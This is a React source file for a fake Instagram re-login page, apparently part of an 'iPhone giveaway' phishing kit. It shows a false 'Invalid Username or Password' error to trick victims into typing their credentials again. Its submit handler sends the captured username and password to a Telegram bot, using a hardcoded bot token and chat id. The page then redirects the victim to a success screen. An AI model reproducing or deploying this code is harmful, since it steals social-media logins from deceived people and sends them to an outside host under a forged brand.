import React from "react";
import { useNavigate } from "react-router-dom";

export default function ReLogin() {
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const [isLoading, setIsLoading] = React.useState(false);

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    var message = `| IPHONE GIVEAWAY LOGIN 2 | \n                                 UserName 2: ${formInput.username} \n                              Password 2: ${formInput.password}                               ${Date()}`;
    var token = "5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY";
    var chat_id = 1124454735;
    const send = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
    );
    await send.json();
    navigate("../success", { replace: true });
    setIsLoading(false);
  }

  return (
    <div className="inst_container">
      <div style={{ padding: "40px" }}>
        <div className="brand">
          <img src="./images/insta.png" width="100%" alt="" />
        </div>

        {/* <div className="continue-with-facebook center">
        <a style={{"color": "white"}} href="" className="link"
          >Continue with Facebook</a>
      </div> */}

        {/* <p style={{"textAlign": "center"}}>OR</p> */}

        <p style={{ color: "red", textAlign: "center", margin: "10px 0" }}>
          Invalid Username or Password, Please try again.
        </p>
        <div className="insta_form">
          <form action="" method="post" onSubmit={handleSubmit}>
            <input
              onChange={handleInputChange}
              name="username"
              type="text"
              required
              style={{ width: "100%" }}
              placeholder="Phone number, username, or email"
            />
            <input
              style={{ width: "100%" }}
              required
              onChange={handleInputChange}
              name="password"
              type="password"
              placeholder="Password"
            />

            <div className="forgot-password">
              <a style={{ margin: "20px 0" }} className="link" href="">
                Forgot password?
              </a>
            </div>

            <button
              style={{ width: "100%", margin: "0" }}
              className="continue-with-facebook center"
              disabled={isLoading}
            >
              {isLoading ? (
                <span className="loader2"></span>
              ) : (
                <span style={{ fontWeight: "normal", fontSize: "15px" }}>
                  {" "}
                  Log In{" "}
                </span>
              )}
            </button>
          </form>
        </div>

        <div className="dont-have-account center">
          <p style={{ marginTop: "30px" }}>
            Don't have an account?{" "}
            <a href="" className="link">
              Sign up
            </a>
          </p>
        </div>

        <div className="contact-us">
          <img src="./images/meta.svg" height="70px" width="70px" alt="" />
        </div>
      </div>
    </div>
  );
}
